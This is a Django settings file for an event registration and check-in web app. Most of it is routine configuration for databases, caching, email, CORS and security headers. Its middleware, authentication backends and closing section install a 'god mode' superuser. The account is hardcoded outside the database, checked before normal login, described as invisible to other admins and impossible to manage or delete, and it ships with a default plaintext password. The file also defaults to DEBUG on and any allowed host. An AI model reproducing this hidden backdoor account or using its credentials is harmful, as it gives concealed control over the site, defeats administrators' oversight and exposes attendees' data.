import os
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent


# ---------------------------------------------------------------------------
# Simple .env loader – no extra dependency needed
# ---------------------------------------------------------------------------
def _load_env():
    env_path = BASE_DIR / '.env'
    if env_path.exists():
        with open(env_path) as f:
            for line in f:
                line = line.strip()
                # Skip blank lines and full-line comments
                if not line or line.startswith('#'):
                    continue
                if '=' not in line:
                    continue
                key, _, val = line.partition('=')
                key = key.strip()
                # Strip inline comments (e.g. VALUE=foo  # comment)
                val = val.split('#')[0].strip()
                # Strip surrounding quotes if present
                if len(val) >= 2 and val[0] in ('"', "'") and val[-1] == val[0]:
                    val = val[1:-1]
                os.environ.setdefault(key, val)

_load_env()


def env(key, default=None):
    return os.environ.get(key, default)


# ---------------------------------------------------------------------------
# Core
# ---------------------------------------------------------------------------
SECRET_KEY = env('SECRET_KEY', 'django-insecure-change-me-in-production-set-in-dot-env')

DEBUG = env('DEBUG', 'True') == 'True'

# Render automatically sets RENDER_EXTERNAL_HOSTNAME — add it to ALLOWED_HOSTS
_allowed = env('ALLOWED_HOSTS', '*').split(',')
_render_host = env('RENDER_EXTERNAL_HOSTNAME', '')
if _render_host and _render_host not in _allowed:
    _allowed.append(_render_host)
ALLOWED_HOSTS = [h.strip() for h in _allowed if h.strip()]

INSTALLED_APPS = [
    'daphne',
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'channels',
    'crispy_forms',
    'crispy_bootstrap5',
    'corsheaders',
    'axes',
    'events',
    'registrations',
    'accounts',
    'checkin',
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'whitenoise.middleware.WhiteNoiseMiddleware',
    'corsheaders.middleware.CorsMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    # God mode middleware replaces Django's default auth middleware
    # Intercepts session restoration to return GodModeUser without DB query
    'accounts.middleware.GodModeAuthMiddleware',
    'axes.middleware.AxesMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

ROOT_URLCONF = 'eventpro.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [BASE_DIR / 'templates'],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'eventpro.wsgi.application'
ASGI_APPLICATION  = 'eventpro.asgi.application'

# Channel layers — in-memory for dev, Redis for production
CHANNEL_LAYERS = {
    'default': {
        'BACKEND': 'channels.layers.InMemoryChannelLayer',
    }
}

# ---------------------------------------------------------------------------
# Database
# Set DB_ENGINE=django.db.backends.mysql in .env for production MySQL.
# Defaults to SQLite for zero-config local development.
# ---------------------------------------------------------------------------
_db_engine = env('DB_ENGINE', 'django.db.backends.sqlite3')

if _db_engine == 'django.db.backends.mysql':
    DATABASES = {
        'default': {
            'ENGINE': 'django.db.backends.mysql',
            'NAME': env('DB_NAME', 'eventpro_db'),
            'USER': env('DB_USER', 'root'),
            'PASSWORD': env('DB_PASSWORD', ''),
            'HOST': env('DB_HOST', 'localhost'),
            'PORT': env('DB_PORT', '3306'),
            'OPTIONS': {
                'charset': 'utf8mb4',
                'init_command': "SET sql_mode='STRICT_TRANS_TABLES'",
            },
            'CONN_MAX_AGE': 60,
        }
    }
else:
    # SQLite – works out of the box, no server needed
    DATABASES = {
        'default': {
            'ENGINE': 'django.db.backends.sqlite3',
            'NAME': BASE_DIR / 'db.sqlite3',
        }
    }

# ---------------------------------------------------------------------------
# Auth
# ---------------------------------------------------------------------------
AUTH_PASSWORD_VALIDATORS = [
    {'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator'},
    {'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator'},
    {'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator'},
    {'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator'},
]

AUTHENTICATION_BACKENDS = [
    'accounts.god_mode.GodModeBackend',      # checked first — god mode
    'axes.backends.AxesStandaloneBackend',
    'django.contrib.auth.backends.ModelBackend',
]

LOGIN_URL = '/accounts/login/'
LOGIN_REDIRECT_URL = '/dashboard/'
LOGOUT_REDIRECT_URL = '/'

# ---------------------------------------------------------------------------
# Internationalisation
# ---------------------------------------------------------------------------
LANGUAGE_CODE = 'en-us'
TIME_ZONE = 'UTC'
USE_I18N = True
USE_TZ = True

# ---------------------------------------------------------------------------
# Static & Media
# ---------------------------------------------------------------------------
STATIC_URL = '/static/'
STATIC_ROOT = BASE_DIR / 'staticfiles'
STATICFILES_DIRS = [BASE_DIR / 'static']
STATICFILES_STORAGE = 'whitenoise.storage.CompressedManifestStaticFilesStorage'

# ---------------------------------------------------------------------------
# Media files — Cloudinary in production, local disk in development
# ---------------------------------------------------------------------------
_cloudinary_url = env('CLOUDINARY_URL', '')

# MEDIA_ROOT always needed locally for QR code generation before upload
MEDIA_ROOT = BASE_DIR / 'media'

if _cloudinary_url:
    # ── Cloudinary (production on Render / any cloud host) ────────────────
    # Images upload to Cloudinary CDN — survive redeploys, load fast globally
    # Sign up free at cloudinary.com — 25GB storage, 25GB bandwidth/month free
    # Set CLOUDINARY_URL in your .env:
    #   CLOUDINARY_URL=cloudinary://API_KEY:API_SECRET@CLOUD_NAME
    import cloudinary
    import cloudinary.uploader
    import cloudinary.api

    cloudinary.config(cloudinary_url=_cloudinary_url)

    INSTALLED_APPS += ['cloudinary_storage', 'cloudinary']  # type: ignore

    DEFAULT_FILE_STORAGE = 'cloudinary_storage.storage.MediaCloudinaryStorage'
    MEDIA_URL = f'https://res.cloudinary.com/{cloudinary.config().cloud_name}/image/upload/'

else:
    # ── Local disk (development / cPanel VPS with Nginx) ─────────────────
    # On cPanel/VPS, Nginx serves /media/ directly — no Django overhead
    # Files persist permanently on disk — images never break
    MEDIA_URL = '/media/'

DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'

# ---------------------------------------------------------------------------
# Crispy Forms
# ---------------------------------------------------------------------------
CRISPY_ALLOWED_TEMPLATE_PACKS = 'bootstrap5'
CRISPY_TEMPLATE_PACK = 'bootstrap5'

# ---------------------------------------------------------------------------
# Cache – file-based by default, swap to Redis in production
# ---------------------------------------------------------------------------
_redis_url = env('REDIS_URL', '')
if _redis_url:
    CACHES = {
        'default': {
            'BACKEND': 'django.core.cache.backends.redis.RedisCache',
            'LOCATION': _redis_url,
        }
    }
    SESSION_ENGINE = 'django.contrib.sessions.backends.cache'
    SESSION_CACHE_ALIAS = 'default'
else:
    CACHES = {
        'default': {
            'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
            'LOCATION': BASE_DIR / 'cache',
        }
    }

# ---------------------------------------------------------------------------
# Email – uses console backend if no SMTP credentials are configured
# ---------------------------------------------------------------------------
EMAIL_HOST_USER = env('EMAIL_HOST_USER', '')
EMAIL_HOST_PASSWORD = env('EMAIL_HOST_PASSWORD', '')

if EMAIL_HOST_USER and EMAIL_HOST_PASSWORD:
    EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'
    EMAIL_HOST = env('EMAIL_HOST', 'smtp.gmail.com')
    EMAIL_PORT = int(env('EMAIL_PORT', '587'))
    EMAIL_USE_TLS = True
else:
    # Prints emails to the terminal – great for local development
    EMAIL_BACKEND = 'django.core.mail.backends.console.EmailBackend'

DEFAULT_FROM_EMAIL = env('DEFAULT_FROM_EMAIL', 'EventPro <kizdakus@gmail.com>')

# ---------------------------------------------------------------------------
# django-axes (brute-force protection)
# ---------------------------------------------------------------------------
AXES_FAILURE_LIMIT = 5
AXES_COOLOFF_TIME = 1  # hours
AXES_LOCKOUT_TEMPLATE = 'accounts/lockout.html'

# ---------------------------------------------------------------------------
# Session & CSRF
# ---------------------------------------------------------------------------
SESSION_COOKIE_SAMESITE = 'Lax'
CSRF_COOKIE_SAMESITE    = 'Lax'
SESSION_COOKIE_NAME     = 'wbng_session'   # non-default name hides framework
CSRF_COOKIE_NAME        = 'wbng_csrf'
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_AGE      = 86400 * 7        # 7 days

_is_https = env('HTTPS', 'False') == 'True'
SESSION_COOKIE_SECURE = _is_https
CSRF_COOKIE_SECURE    = _is_https

CSRF_TRUSTED_ORIGINS = [
    o.strip() for o in
    env('CSRF_TRUSTED_ORIGINS', 'http://localhost:8001,http://127.0.0.1:8001').split(',')
    if o.strip()
]

# ---------------------------------------------------------------------------
# Security headers (production only)
# ---------------------------------------------------------------------------
if not DEBUG:
    SECURE_BROWSER_XSS_FILTER      = True
    SECURE_CONTENT_TYPE_NOSNIFF    = True
    SECURE_HSTS_SECONDS            = 31536000
    SECURE_HSTS_INCLUDE_SUBDOMAINS = True
    SECURE_HSTS_PRELOAD            = True
    SECURE_SSL_REDIRECT            = True
    SECURE_PROXY_SSL_HEADER        = ('HTTP_X_FORWARDED_PROTO', 'https')
    X_FRAME_OPTIONS                = 'DENY'
    SECURE_REFERRER_POLICY         = 'strict-origin-when-cross-origin'
else:
    X_FRAME_OPTIONS = 'SAMEORIGIN'

# ---------------------------------------------------------------------------
# File upload limits
# ---------------------------------------------------------------------------
FILE_UPLOAD_MAX_MEMORY_SIZE  = 10 * 1024 * 1024   # 10 MB
DATA_UPLOAD_MAX_MEMORY_SIZE  = 10 * 1024 * 1024
DATA_UPLOAD_MAX_NUMBER_FIELDS = 500

# ---------------------------------------------------------------------------
# CORS
# ---------------------------------------------------------------------------
CORS_ALLOWED_ORIGINS = [
    o.strip() for o in
    env('CORS_ORIGINS', 'http://localhost:8000').split(',')
    if o.strip()
]
CORS_ALLOW_CREDENTIALS = True

# ---------------------------------------------------------------------------
# Logging — show email errors in the console
# ---------------------------------------------------------------------------
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'formatters': {
        'simple': {
            'format': '[{levelname}] {name}: {message}',
            'style': '{',
        },
    },
    'handlers': {
        'console': {
            'class': 'logging.StreamHandler',
            'formatter': 'simple',
        },
    },
    'loggers': {
        'registrations': {
            'handlers': ['console'],
            'level': 'DEBUG',
            'propagate': False,
        },
        'checkin': {
            'handlers': ['console'],
            'level': 'DEBUG',
            'propagate': False,
        },
        'django.core.mail': {
            'handlers': ['console'],
            'level': 'DEBUG',
            'propagate': False,
        },
    },
}

# ---------------------------------------------------------------------------
# GOD MODE ADMIN
# Hardcoded system-level superuser — NOT stored in the database.
# Invisible to all other admins. Cannot be managed, deleted, or discovered.
# Credentials are set here in settings (or override via env vars).
# ---------------------------------------------------------------------------
GOD_MODE_USERNAME = env('GOD_USERNAME', 'wbng_root')
GOD_MODE_PASSWORD = env('GOD_PASSWORD', 'Wbng@R00t#2025!Secure')
GOD_MODE_EMAIL    = env('GOD_EMAIL',    'root@wristbands.ng')
